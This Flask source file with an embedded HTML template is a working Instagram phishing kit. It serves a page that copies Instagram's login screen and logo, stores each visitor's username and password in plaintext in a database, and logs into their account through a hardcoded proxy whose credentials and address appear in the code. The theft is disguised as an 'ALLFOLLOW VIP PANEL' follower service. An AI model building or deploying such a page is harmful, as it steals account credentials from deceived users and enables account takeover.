import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "final-v73-pro"

db = SQLAlchemy(app)
# Proxy sorun çıkarırsa burayı None yapabilirsin
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Sistem Hazırlanıyor...")

# --- ARKADA ÇALIŞAN BOT MOTORU ---
def bot_engine(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Cihaz ayarlarını simüle et (Instagram engeli yememek için)
            cl.set_device_settings(cl.delay_range == [2, 5])
            cl.login(u, p)
            acc.status = "AKTİF ✅"
            db.session.commit()
            # Takip işlemini başlat
            cl.user_follow(cl.user_id_from_username("instagram"))
        except Exception as e:
            # Hata ne olursa olsun kullanıcıyı panelde tut, durumu güncelle
            print(f"Bot Hatası: {e}")
            acc.status = "ONAY VEYA HATA ⚠️"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Kullanıcıyı veritabanına anında işle (veya güncelle)
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Bağlanıyor..."
    db.session.commit()
    
    # Thread'i başlat ve saniyesinde 'ok' dön (BEKLEME YAPMA)
    t = threading.Thread(target=bot_engine, args=(u, p))
    t.daemon = True
    t.start()
    return jsonify(status="started")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "Bilinmiyor")

# --- UI: SIFIR BEKLEME GARANTİLİ ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.page { display: none; } .active { display: block; }</style>
</head>
<body class="bg-[#fafafa] font-sans">

    <div id="p1" class="page active flex flex-col items-center mt-12">
        <div class="bg-white border border-gray-300 p-10 w-[350px] flex flex-col items-center shadow-sm">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8">
            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2 mb-2 bg-gray-50 border border-gray-300 rounded text-xs outline-none focus:border-gray-400">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 mb-4 bg-gray-50 border border-gray-300 rounded text-xs outline-none focus:border-gray-400">
            <button onclick="baglan()" id="btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm hover:bg-[#1877f2] transition-all">Giriş Yap</button>
        </div>
    </div>

    <div id="p2" class="page min-h-screen bg-gray-50">
        <nav class="bg-white border-b p-4 text-center font-black italic text-purple-600 shadow-sm">ALLFOLLOW VIP PANEL</nav>
        <div class="p-6 max-w-sm mx-auto">
            
            <div id="card" class="bg-white p-12 rounded-[50px] shadow-2xl border-b-8 border-purple-600 text-center mb-8">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2 tracking-tighter">Bağlantı Durumu</p>
                <h2 id="msg" class="text-2xl font-black text-purple-600 animate-pulse italic uppercase">BAĞLANILIYOR...</h2>
            </div>

            <div class="bg-white p-5 rounded-3xl border flex items-center justify-between shadow-sm">
                <div>
                    <p class="text-[9px] text-gray-400 font-bold uppercase">Hesap Sahibi</p>
                    <p id="utag" class="font-black text-gray-800 text-sm"></p>
                </div>
                <div class="w-12 h-12 bg-purple-100 rounded-2xl flex items-center justify-center text-purple-600 font-bold italic shadow-inner">IG</div>
            </div>

            <div class="mt-8 grid grid-cols-2 gap-4">
                <div class="p-4 bg-white rounded-2xl border text-center opacity-40"><p class="text-[10px] font-bold">TAKİPÇİ</p></div>
                <div class="p-4 bg-white rounded-2xl border text-center opacity-40"><p class="text-[10px] font-bold">BEĞENİ</p></div>
            </div>
        </div>
    </div>

    <script>
        let cur = "";
        function baglan() {
            cur = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!cur || !p) return;

            // --- DEVRİMSEL KISIM: BEKLEME YAPMADAN PANELİ AÇ ---
            document.getElementById('p1').classList.remove('active');
            document.getElementById('p2').classList.add('active');
            document.getElementById('utag').innerText = "@" + cur;

            // Arka plana fırlat (Cevabı bekleme!)
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:cur, p:p})
            });

            // Durumu her 3 saniyede bir sessizce kontrol et
            setInterval(async () => {
                try {
                    const r = await fetch('/api/status/' + cur);
                    const d = await r.json();
                    const m = document.getElementById('msg');
                    const c = document.getElementById('card');
                    m.innerText = d.status;
                    
                    if(d.status.includes("✅")) {
                        m.classList.remove('animate-pulse');
                        m.style.color = "#22c55e";
                        c.style.borderColor = "#22c55e";
                    } else if(d.status.includes("⚠️")) {
                        m.style.color = "#f59e0b";
                        c.style.borderColor = "#f59e0b";
                    }
                } catch(e) {}
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
